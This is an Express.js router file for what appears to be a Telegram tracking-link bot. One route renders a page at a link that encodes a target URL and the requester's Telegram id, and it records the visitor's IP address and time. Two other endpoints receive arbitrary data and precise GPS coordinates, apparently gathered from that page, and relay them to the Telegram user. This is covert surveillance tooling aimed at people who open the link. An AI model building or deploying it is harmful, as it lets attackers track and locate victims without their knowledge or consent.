const express = require("express");
const bot = require("../bot");

const router = express.Router();

router.post("/", (req, res) => {
  let { data, uid } = req.body;

  if (data !== undefined || uid !== undefined) {
    data = data.replaceAll("<br>", "\n");

    bot.telegram.sendMessage(uid, data, { parse_mode: "HTML" });
  }

  res.sendStatus(200);
});

router.post("/location", (req, res) => {
  let { latitude, longitude, accuracy, uid } = req.body;

  if (
    longitude != null &&
    latitude != null &&
    uid != null &&
    accuracy != null
  ) {
    bot.telegram.sendLocation(uid, latitude, longitude);
    bot.telegram.sendMessage(
      uid,
      `Latitude: ${latitude}\nLongitude: ${longitude}\nAccuracy: ${accuracy} meters`
    );
  }

  res.sendStatus(200);
});

router.get("/u/:path/:uid", (req, res) => {
  let ip;
  let d = new Date().toJSON().slice(0, 19).replace("T", ":");

  const { uid, path } = req.params;

  if (req.headers["x-forwarded-for"]) {
    ip = req.headers["x-forwarded-for"].split(",")[0];
  } else if (req.connection && req.connection.remoteAddress) {
    ip = req.connection.remoteAddress;
  } else {
    ip = req.ip;
  }

  if (!uid || !path) {
    res.redirect("https://telegram.dog/botcodes123");
    return;
  }

  const decodedPath = path ? atob(path) : "";

  res.render("index", {
    ip: ip,
    time: d,
    url: decodedPath,
    uid: parseInt(uid, 36),
    a: process.env.BASE_URL,
  });
});

module.exports = router;
